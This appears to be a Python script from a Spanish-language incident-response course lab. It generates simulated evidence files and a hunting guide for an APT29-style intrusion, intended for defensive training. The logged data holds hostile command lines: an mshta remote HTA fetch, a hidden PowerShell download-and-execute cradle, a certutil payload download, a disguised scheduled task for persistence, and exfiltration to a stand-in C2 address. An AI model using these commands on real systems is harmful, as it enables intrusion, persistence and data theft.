#!/usr/bin/env python3
"""
generate_apt_scenario.py - Genera escenario APT multi-fase para warm-up
Simula APT29 (Cozy Bear) con 3 fases: Initial Access, Execution, Exfiltration
Curso MAR404 - Clase 11 - Lab 21
"""
import json, os
from datetime import datetime, timedelta

EVIDENCE_DIR = "/evidence"
os.makedirs(f"{EVIDENCE_DIR}/network", exist_ok=True)
os.makedirs(f"{EVIDENCE_DIR}/memory", exist_ok=True)
os.makedirs(f"{EVIDENCE_DIR}/filesystem", exist_ok=True)

base_time = datetime(2025, 7, 22, 9, 0, 0)

# === PHASE 1: Initial Access (Spearphishing) ===
network_phase1 = [
    {"timestamp": (base_time).isoformat(), "src": "203.0.113.100", "dst": "10.0.1.50", "proto": "SMTP", "info": "Email from 'hr@partner-corp.com' with attachment 'Q3_Report.docm'", "phase": "Initial Access", "mitre": "T1566.001"},
    {"timestamp": (base_time + timedelta(minutes=2)).isoformat(), "src": "10.0.1.50", "dst": "198.51.100.20", "proto": "HTTPS", "info": "GET /templates/update.hta (macro callback)", "phase": "Initial Access", "mitre": "T1204.002"},
]

# === PHASE 2: Execution + Persistence ===
memory_phase2 = [
    {"timestamp": (base_time + timedelta(minutes=5)).isoformat(), "process": "WINWORD.EXE", "pid": 4200, "action": "Spawns mshta.exe", "cmdline": "mshta http://198.51.100.20/templates/update.hta", "phase": "Execution", "mitre": "T1218.005"},
    {"timestamp": (base_time + timedelta(minutes=6)).isoformat(), "process": "mshta.exe", "pid": 4500, "action": "Spawns powershell.exe", "cmdline": "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.20/s')\"", "phase": "Execution", "mitre": "T1059.001"},
    {"timestamp": (base_time + timedelta(minutes=7)).isoformat(), "process": "powershell.exe", "pid": 4800, "action": "Creates scheduled task", "cmdline": "schtasks /create /tn 'OneDriveSync' /tr 'C:\\Users\\Public\\sync.exe' /sc hourly", "phase": "Persistence", "mitre": "T1053.005"},
    {"timestamp": (base_time + timedelta(minutes=8)).isoformat(), "process": "powershell.exe", "pid": 4800, "action": "Downloads payload", "cmdline": "certutil -urlcache -split -f http://198.51.100.20/sync.exe C:\\Users\\Public\\sync.exe", "phase": "Execution", "mitre": "T1105"},
]

# === PHASE 3: Exfiltration ===
network_phase3 = [
    {"timestamp": (base_time + timedelta(minutes=30)).isoformat(), "src": "10.0.1.50", "dst": "198.51.100.20", "proto": "HTTPS", "info": "C2 beacon (interval: 60s, jitter: 15%)", "phase": "C2", "mitre": "T1071.001"},
    {"timestamp": (base_time + timedelta(hours=1)).isoformat(), "src": "10.0.1.50", "dst": "198.51.100.20", "proto": "HTTPS", "info": "POST /api/upload (2.3MB compressed data)", "phase": "Exfiltration", "mitre": "T1041"},
]

filesystem_evidence = [
    {"path": "C:\\Users\\jsmith\\Downloads\\Q3_Report.docm", "size": 85000, "created": base_time.isoformat(), "note": "Malicious macro document"},
    {"path": "C:\\Users\\Public\\sync.exe", "size": 450000, "created": (base_time + timedelta(minutes=8)).isoformat(), "note": "Cobalt Strike beacon"},
    {"path": "C:\\Windows\\Temp\\recon.txt", "size": 3000, "created": (base_time + timedelta(minutes=15)).isoformat(), "note": "whoami /all + ipconfig output"},
]

# Save all evidence
with open(f"{EVIDENCE_DIR}/network/traffic_log.json", "w") as f:
    json.dump(network_phase1 + network_phase3, f, indent=2)

with open(f"{EVIDENCE_DIR}/memory/process_events.json", "w") as f:
    json.dump(memory_phase2, f, indent=2)

with open(f"{EVIDENCE_DIR}/filesystem/artifacts.json", "w") as f:
    json.dump(filesystem_evidence, f, indent=2)

# Create hunting guide
guide = {
    "scenario": "APT29 Simulation - Cozy Bear",
    "target": "ACME Corp - Finance Department",
    "phases": ["Initial Access", "Execution", "Persistence", "C2", "Exfiltration"],
    "evidence_locations": {
        "network": "/evidence/network/traffic_log.json",
        "memory": "/evidence/memory/process_events.json",
        "filesystem": "/evidence/filesystem/artifacts.json"
    },
    "questions": [
        "1. ¿Cuál fue el vector de entrada inicial?",
        "2. ¿Qué proceso padre generó la cadena de ejecución?",
        "3. ¿Qué mecanismo de persistencia se instaló?",
        "4. ¿Cuál es la IP del C2?",
        "5. ¿Qué datos se exfiltraron y cuánto?",
        "6. Mapee cada acción a MITRE ATT&CK"
    ]
}

with open(f"{EVIDENCE_DIR}/HUNTING_GUIDE.json", "w") as f:
    json.dump(guide, f, indent=2)

print("[+] APT simulation evidence generated")
print(f"    Network events: {len(network_phase1 + network_phase3)}")
print(f"    Memory events: {len(memory_phase2)}")
print(f"    Filesystem artifacts: {len(filesystem_evidence)}")
